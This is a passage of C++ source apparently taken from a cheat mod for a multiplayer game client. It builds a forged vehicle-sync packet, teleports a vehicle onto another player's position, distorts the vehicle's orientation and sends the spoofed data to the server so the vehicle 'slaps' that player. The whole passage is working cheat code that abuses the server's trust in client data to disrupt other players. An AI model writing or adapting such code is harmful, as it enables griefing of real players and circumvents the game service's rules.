				memset(&sync, 0, sizeof(stInCarData));

				sync.sVehicleID = usClosestVehicleSAMPID;
				sync.fVehicleHealth = pSlapperVehicle->hitpoints;
				sync.bytePlayerHealth = self->hitpoints;
				sync.byteArmor = self->armor;
						
				sync.fQuaternion[0] = 0.707107;
				sync.fQuaternion[1] = -0.707107;
				sync.fQuaternion[2] = 0;
				sync.fQuaternion[3] = 0;

				sync.fPosition[0] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[0];
				sync.fPosition[1] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[1]; 
				sync.fPosition[2] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[2] - 0.75f;
					
				cheat_vehicle_teleport(pSlapperVehicle, sync.fPosition, 0);

				pSlapperVehicle->base.matrixStruct->right.X = 1;
				pSlapperVehicle->base.matrixStruct->right.Y = 1;
				pSlapperVehicle->base.matrixStruct->right.Z = 1;

				pSlapperVehicle->base.matrixStruct->up.Z = 1;

				GTAfunc_RemoveActorFromCarAndPutAt(pos);

				bsVehicleSync.Reset();
				bsVehicleSync.Write((BYTE)ID_VEHICLE_SYNC);
				bsVehicleSync.Write((PCHAR)&sync,sizeof(stInCarData));

	
				g_DrifeitClient->Send(&bsVehicleSync, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);

				usFoundVehicleID = sync.sVehicleID;
				dwVehicleFoundTick = GetTickCount();
			}
		}
	}
}